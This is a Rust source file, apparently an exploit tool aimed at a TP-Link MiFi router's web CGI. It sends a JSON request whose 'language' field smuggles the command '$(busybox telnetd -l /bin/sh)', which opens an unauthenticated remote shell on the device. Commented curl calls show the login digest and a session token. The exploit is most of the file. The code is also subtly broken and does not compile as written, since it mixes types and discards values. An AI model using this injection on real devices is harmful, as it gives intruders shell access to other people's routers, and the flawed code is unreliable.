use std::{collections::HashMap, ops::Add};
use clap::Parser;
use reqwest::header::*;
use serde::{Deserialize, Serialize};
use serde_json::Result;


#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Filename
    #[arg(required = true)]
    token: String,
}

/*
	curl 'http://tplinkmifi.net/cgi-bin/qcmap_auth' 
	-X POST 
	-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0' 
	-H 'Accept: application/json, text/javascript, *SLASH*; q=0.01' 
	-H 'Accept-Language: de,en-US;q=0.7,en;q=0.3' 
	-H 'Accept-Encoding: gzip, deflate' 
	-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' 
	-H 'X-Requested-With: XMLHttpRequest' 
	-H 'Origin: http://tplinkmifi.net' 
	-H 'Connection: keep-alive' 
	-H 'Referer: http://tplinkmifi.net/login.html' 
	-H 'Pragma: no-cache' 
	-H 'Cache-Control: no-cache' 
	--data-raw '{"module":"authenticator","action":1,"digest":"0d8777ad7c35bbb0aa9a795e70e408f6"}'*/

#[derive(Serialize, Deserialize)]
struct Auth {
	module: String,
	action: u8,
	digest: String
}

/*
{"token":"Ваше значение token","module":"webServer","action":1,"language":"$(busybox telnetd -l /bin/sh)"}
*/
#[derive(Serialize, Deserialize)]
struct Payload {
	token: String,
	module: String,
	action: u8,
	language: String
}


#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {

	let args = Args::parse();
	let token = args.token;

	let telnet = "bla".to_string();
	let english = "english".to_string();

	/*
	curl 'http://192.168.0.1/cgi-bin/qcmap_web_cgi' 
		-X POST 
		-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0' 
		-H 'Accept: application/json, text/javascript, *SLASH*; q=0.01' 
		-H 'Accept-Language: de,en-US;q=0.7,en;q=0.3' 
		-H 'Accept-Encoding: gzip, deflate' 
		-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' 
		-H 'X-Requested-With: XMLHttpRequest' 
		-H 'Origin: http://192.168.0.1' 
		-H 'Connection: keep-alive' 
		-H 'Referer: http://192.168.0.1/settings.html' 
		-H 'Cookie: tpweb_token=xZorYxwA357MLtbd' 
		-H 'Pragma: no-cache' 
		-H 'Cache-Control: no-cache' 
		--data-raw '{"token":"xZorYxwA357MLtbd","module":"storageShare","action":1,"mode":0,"login":0,"rwPermission":1}'
	 */

	let mut cookie = "tpweb_token=".to_string();
	cookie.add(&token);

	let mut headers = HeaderMap::new();
	headers.append(
		USER_AGENT,
		"Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0".parse().unwrap()
	);
	headers.insert(
		"Accept".to_string(),
		"application/json, text/javascript, *SLASH*; q=0.01".to_string()
	);
	headers.insert(
		"Accept-Language".to_string(),
		"de,en-US;q=0.7,en;q=0.3".to_string()
	);
	headers.insert(
		"Accept-Encoding".to_string(),
		"gzip, deflate".to_string()
	);
	headers.insert(
		"Content-Type".to_string(),
		"application/x-www-form-urlencoded; charset=UTF-8".to_string()
	);
	headers.insert(
		"X-Requested-With".to_string(),
		"XMLHttpRequest".to_string()
	);
	headers.insert(
		"Origin".to_string(),
		"http://192.168.0.1".to_string()
	);
	headers.insert(
		"Connection".to_string(),
		"keep-alive".to_string()
	);
	headers.insert(
		"Referer".to_string(),
		"http://192.168.0.1/settings.html".to_string()
	);
	headers.insert(
		"Cookie".to_string(),
		String::from(&cookie)
	);
	headers.insert(
		"Pragma".to_string(),
		"no-cache".to_string()
	);
	headers.insert(
		"Cache-Control".to_string(),
		"no-cache".to_string()
	);

	/*{"token":"Ваше значение token","module":"webServer","action":1,"language":"$(busybox telnetd -l /bin/sh)"}*/

	let payload = Payload {
		token: &token,
		module: "webserver".to_string(),
		action: 1,
		language: "$(busybox telnetd -l /bin/sh)".to_string()
	};

	let payload_restore_language = Payload {
		token: &token,
		module: "webserver".to_string(),
		action: 1,
		language: "en".to_string()
	};

	println!("{token:#?}");

	let client = reqwest::Client::new();

	let resp = client.post("http://192.168.0.1")
		.json(&payload)
		.headers(headers)
		.send()
		.await?;

    println!("{resp:#?}");
    Ok(())
}

